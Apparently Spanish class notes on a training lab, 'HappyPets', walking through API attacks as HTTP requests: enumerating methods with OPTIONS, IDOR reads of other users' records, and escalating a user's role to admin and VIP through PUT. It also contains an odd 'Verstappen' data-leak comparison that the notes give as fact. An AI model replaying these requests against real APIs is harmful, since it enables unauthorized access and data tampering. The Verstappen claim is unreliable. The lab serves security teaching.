## ① Laboratorio HappyPets — Contexto

El laboratorio tiene:
- Un endpoint de login (`POST /api/login`)
- Un endpoint de mascotas (`GET /api/pets`, `POST /api/pets`, `PUT /api/pets/{id}`, `DELETE /api/pets/{id}`)
- Un endpoint de usuarios (`GET /api/users/{id}`, `PUT /api/users/{id}`)
- Usuarios de prueba: `admin` / `admin123`, `ana` / `ana123`

---

## ② Paso 1 — Login y obtención de JWT

```
POST /api/login
{
  "username": "admin",
  "password": "admin123"
}
```

**Respuesta:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "user_id": 3,
  "role": "admin",
  "username": "admin"
}
```

> [!important] Información revelada
> La respuesta del login nos da: el ID del usuario (3), el rol (`admin`), y el nombre. Esto nos dice cómo está estructurada la base de datos.

---

## ③ Paso 3 — Options para enumerar métodos

```
OPTIONS /api/pets
```

**Respuesta:**
```
Allow: GET, POST, PUT, DELETE, OPTIONS
```

> [!important] Flag: OPTIONS Explorer
> Al lanzar OPTIONS nos dan una flag. Esto confirma que el endpoint acepta DELETE, que es peligroso.

---

## ④ Paso 4 — Crear una mascota (POST)

```
POST /api/pets
{
  "name": "Rex",
  "breed": "perro"
}
```

**Respuesta:**
```json
{
  "id": 6,
  "name": "Rex",
  "breed": "perro"
}
```

---

## ⑤ Paso 5 — IDOR: Acceder a mascotas de otros usuarios

```
GET /api/pets/5
```

**Respuesta:**
```json
{
  "id": 5,
  "name": "Anduin",
  "breed": "gorro",
  "owner": "admin"
}
```

> [!important] IDOR confirmado
> Nosotros somos `ana`, pero podemos ver la mascota de `admin`. Esto es un IDOR: el frontend solo muestra nuestras mascotas, pero la API no valida el propietario.

---

## ⑥ Paso 6 — Obtener usuarios (Information Disclosure)

```
GET /api/users/0
```

**Respuesta:**
```json
{
  "id": 0,
  "username": "admin",
  "role": "admin",
  "email": "admin@happypets.local"
}
```

> [!important] Data Exposed
> Accedemos a la información del administrador. Al iterar los IDs (0, 1, 2, 3) descubrimos todos los usuarios.

---

## ⑦ Paso 7 — Escalada de privilegios vía PUT

```
PUT /api/users/1
{
  "role": "admin"
}
```

**Respuesta:**
```json
{
  "id": 1,
  "username": "ana",
  "role": "admin"
}
```

> [!important] Escalada exitosa
> Con un simple PUT cambiamos el rol de `ana` a `admin`. Esto es lo que le pasó a Max Verstappen con la FIA.

---

## ⑧ Paso 8 — Borrar mascotas con rol admin

```
DELETE /api/pets/4
```

**Resultado:** `200 OK` — Mascota borrada.

> [!important] Control de acceso por método
> El DELETE está protegido solo para admins. Pero como hemos escalado privilegios, ahora podemos borrar.

---

## ⑨ Paso 9 — Cambiar rol a VIP

```
PUT /api/users/1
{
  "role": "vip"
}
```

**Respuesta:**
```json
{
  "id": 1,
  "username": "ana",
  "role": "vip"
}
```

> [!important] Doble escalada
> Primero nos hacemos admin, luego VIP. La API no valida que un usuario pueda cambiar su propio rol.

## ⑩ Resumen de vulnerabilidades encontradas

| Vulnerabilidad | Categoría OWASP | Cómo se explotó |
|---|---|---|
| IDOR en mascotas | API1 | `GET /api/pets/5` sin ser propietario |
| Información expuesta | API3 | `GET /api/users/0` devuelve datos del admin |
| Escalada de privilegios | API5 | `PUT /api/users/1` con `role: admin` |
| DELETE sin control por usuario | API1 | `DELETE /api/pets/4` con token de admin |
| Asignación masiva de roles | API6 | `PUT /api/users/1` con `role: vip` |

## ⑪ Metodología de auditoría de APIs

1. **Enumerar endpoints** con OPTIONS y documentación
2. **Probar cada método** (GET, POST, PUT, PATCH, DELETE) en cada endpoint
3. **Buscar IDOR** iterando IDs de usuarios/objetos
4. **Probar escalada** modificando roles o campos sensibles
5. **Usar Intruder** para fuzzing de IDs y payloads
6. **Documentar todo** con evidencias (capturas, peticiones, respuestas)

---

## ⑫ Notas de clase

- **El token JWT identifica al usuario**: si puedes modificar el payload, puedes escalar privilegios.
- **Cada método tiene su propio control**: DELETE puede estar protegido pero GET no.
- **OPTIONS es fundamental** para descubrir qué métodos están habilitados.
- **IDOR es la vulnerabilidad más común** en APIs: siempre verificar que el usuario solo accede a sus propios datos.
- **La mayoría de APIs tienen esta vulnerabilidad** porque los desarrolladores solo protegen el frontend.
- **En entornos reales**, esto puede llevar a filtración de datos masiva (caso Verstappen).
- **Hack the Box**: Las claves VIP se dan el lunes para empezar con máquinas premium.
